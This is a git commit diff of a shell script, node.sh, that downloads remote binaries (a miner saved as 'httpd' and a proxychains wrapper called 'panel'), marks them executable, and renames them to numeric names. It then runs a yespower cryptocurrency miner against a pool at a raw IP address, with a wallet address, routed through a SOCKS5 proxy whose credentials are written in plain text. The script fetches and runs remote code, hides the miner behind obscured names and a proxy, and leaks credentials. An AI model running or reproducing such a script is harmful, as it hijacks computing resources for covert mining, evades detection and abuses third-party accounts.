29f5d0182eaae77068d041643c8e69c26fe1b3da
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-11 19:43:24 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,9 +1,9 @@
-proxy="34.238.108.61" 
+proxy="us-east-static-01.quotaguard.com" 
 port="9293" 
-user="9g4h0jzzs3ejmx"  
-pass="jrwert8snib9ee9v16c9k264pv" 
-wget -q -O Arakawa https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Arakawa
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+user="5d1u5nqzx8fm9m"  
+pass="dcd4ndgvvxw2knswiggb8wxia41e" 
+wget -q -O 20383396 https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x 20383396
+wget -q -O 2020999 https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x 2020999 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Arakawa -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Arakawa) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://9g4h0jzzs3ejmx:jrwert8snib9ee9v16c9k264pv@us-east-static-04.quotaguard.com:1080 
+./2020999 ./20383396 -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Diez) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5d1u5nqzx8fm9m:dcd4ndgvvxw2knswiggb8wxia41e@us-east-static-01.quotaguard.com:1080 
